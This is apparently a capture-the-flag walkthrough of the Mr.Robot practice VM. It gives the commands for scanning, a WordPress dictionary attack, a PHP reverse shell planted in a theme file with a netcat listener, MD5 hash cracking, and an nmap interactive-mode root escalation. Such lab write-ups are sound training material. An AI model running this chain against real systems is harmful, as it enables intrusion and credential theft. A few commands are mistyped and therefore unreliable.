# Mr.Robot-Walkthrough-FalseBeliefsYT
Walkthrough for Mr.Robot virtual machine


Starting the attack I had to identify the virtual machine IP addr. I did this by running rubicon which is a script I programmed. The nmap scrip that it runs is "nmap -sn 192.168.0.0/24". This scans the range of IP's in that range to list all IP's on my network. To recreate this on your own network run ifconfig and if it returns 192.168.1.XXX then use 192.168.1.0/24 as your range or adapt for your IP addr. As you can see the NMAP scan returned the information below and I determined that the target IP addr is 192.168.0.166

Script: nmap -sn 192.168.0.0/24

![image](https://github.com/user-attachments/assets/2f567524-3325-406a-8160-a38b03c63eb0)

After identifying the machine to attack I ran an nmap scan on the machine and seen it was running port 80, so I hopped on firefox and went to the IP addr

Script: nmap 192.168.0.166


![Screenshot from 2024-09-25 19-15-41](https://github.com/user-attachments/assets/babb5a6b-d851-46ac-9bfa-4d2fe35515da)

Once on the website I let it load

![Screenshot from 2024-09-25 19-15-51](https://github.com/user-attachments/assets/25d625f3-5497-4e4d-8f48-0e30e50b6241)

through a ffuf scan I seen there was a robots.txt file. Makes sense to check that the machine being name Mr.Robot, upon entering the webpage 192.168.0.166/robots.txt I seen 2 files. so I quickly used wget to downlaod them to my machine

Script: ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://192.168.0.166/FUZZ

Script: wget http://192.168.0.166/key-1-of-3.txt

![Screenshot from 2024-09-25 19-20-58](https://github.com/user-attachments/assets/43f0ccde-d435-470b-b11e-e7c95c19e856)

Script: wget http://192.168.0.166/fsocity.dic

![Screenshot from 2024-09-25 19-21-20](https://github.com/user-attachments/assets/1615f6b9-eb4b-4d6f-9a57-fadb9ca2d93c)

The fuff scan I ran also told me WordPress was running on the machine so I went to 192.168.0.166/wp-login

![Screenshot from 2024-09-25 19-18-26](https://github.com/user-attachments/assets/55610244-c20d-4f6e-bc7d-3112100e6c29)

while that was loading I decided to cat out the fsocity.dic and seen it had alot of repeated words. I ran a sort command for the unique words and outputted it to a file call sorted_fsocity.dic

Script: cat fsocity.dic | sort -u sorted_fsocity.dic

![Screenshot from 2024-09-25 19-21-48](https://github.com/user-attachments/assets/2fee498f-8953-4aae-bb65-973431778bd8)

I then ran a wpscan to enumerate information about the Wordpress website

Script: wpscan --url http://192.168.0.166/wp-login -u e

After that I found the user Elliot and ran a dictionary attack on the user elliot on the WordPress link and found the password ER28-0652

Script: wpscan --url http://192.168.0.166/wp-login -P sorted_fsocity.dic -U elliot

![image](https://github.com/user-attachments/assets/ad93a3bd-4968-4fc1-8024-dc00ab702a55)

After that I logged into the WordPress site and after some digging I found I could edit files as user elliot. I edited the 404.php file located in Appearance -> Editor on the WordPress site with the reverse-php-script from pentestmonkey (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and changed the IP address to match mine.

![Screenshot from 2024-09-25 19-25-59](https://github.com/user-attachments/assets/e0b4c368-5bc7-4631-aa7b-9f53a26e5502)

![Screenshot from 2024-09-25 19-25-21](https://github.com/user-attachments/assets/7cc156ad-cade-4d09-be02-b6d82d2f180b)

![Screenshot from 2024-09-25 19-26-15](https://github.com/user-attachments/assets/b910d9dd-1454-41b8-b181-11f63d2aa7ff)

After that I setup a netcat listener on port 1234 on my local machine and went to a page that didnt exist to activate the reverse shell

Script: nc -nlvp 1234

![Screenshot from 2024-09-25 19-27-43](https://github.com/user-attachments/assets/aef9af1f-d277-443b-a889-8a600cb8024b)

![Screenshot from 2024-09-25 19-28-20](https://github.com/user-attachments/assets/157a749a-9a86-488a-b0aa-9ff5c4c5ab97)

And we got our reverse shell!!

![Screenshot from 2024-09-26 19-16-25](https://github.com/user-attachments/assets/26f3b32f-a639-4a36-8f83-86998cf4c9b7)

I then spawned a bash shell with python

Script: python -c "import pty;pty.spawn('/bin/bash')"

![Screenshot from 2024-09-26 19-22-20](https://github.com/user-attachments/assets/20531b44-9293-4550-867e-30bfbcef487b)

I ran sudo -l to see what the user could run as root. daemon couldnt run anything as root!

Script: sudo -l

![Screenshot from 2024-09-26 19-23-09](https://github.com/user-attachments/assets/1b0b0117-d807-4256-b884-105f00e1c0f1)


I then checked the home directory to see what users were on the machine and found a user called robot

Script: ls /home/

![Screenshot from 2024-09-26 19-25-14](https://github.com/user-attachments/assets/eb437a6c-c438-48b0-963c-62b8f7cc41a8)


I then cd'ed into the users directory and listed out all the files. I found a password.raw-md5 file (pink) and a key-2-of-3.txt file (yellow) I attemped to cat out the key file to no avail and the MD5 hash for the robot users password was in the password.raw-md5 file.

![image](https://github.com/user-attachments/assets/4c12a6ae-134c-4a36-aa94-9f4f99a0cd86)

I used a website to decode the hash (hashes.com) and it gave me the password abcdefghijklmnopqrstuvwxyz

![Screenshot from 2024-09-26 19-27-01](https://github.com/user-attachments/assets/1ed903ef-2ff2-485b-a48b-f41cbed0beaa)

I then SU into robot

Script: su robot
Password: abcdefghijklmnopqrstuvwxyz

![Screenshot from 2024-09-26 19-29-54](https://github.com/user-attachments/assets/0b131049-684d-45ff-bf26-7379423eea44)

Now that I was the user robot I tried to cat out the key file and got the next key

![Screenshot from 2024-09-26 19-30-19](https://github.com/user-attachments/assets/4aa087bd-b138-4528-a4f9-d1da8b10c4ee)

After that I cd'ed into the usr/local/bin to see what custom scrips or scripts I could use where there and found nmap so I started an interactive mode nmap scan and ran !sh to spawn a root shell because nmap I seen nmap was running version 3.18 using nmap -V.

Script: cd /usr/local/bin
Script nmap -V
Script: nmap --interactive
Script !sh

![Screenshot from 2024-09-26 19-32-19](https://github.com/user-attachments/assets/61e22a49-c99f-43a1-aca9-c08856517a3e)

Finally I cd'ed to the root folder and cat'd out the last key file needed to complete this machine

Script: cat /root/key-3-of-3.txt

![Screenshot from 2024-09-26 19-32-56](https://github.com/user-attachments/assets/963aa2a4-335e-4466-b092-5c7ed02184e3)

NOTE:
I ran into an issue where the reverse shell wasn't working. Ensure there are no firewall settings blocking you machine from being connected to. To stop the standard kali linux firewall run "sudo systemsctl stop ufw" and run "sudo systemsctl start ufw" to start it back up when you're done. Cyber Saftey is super important.
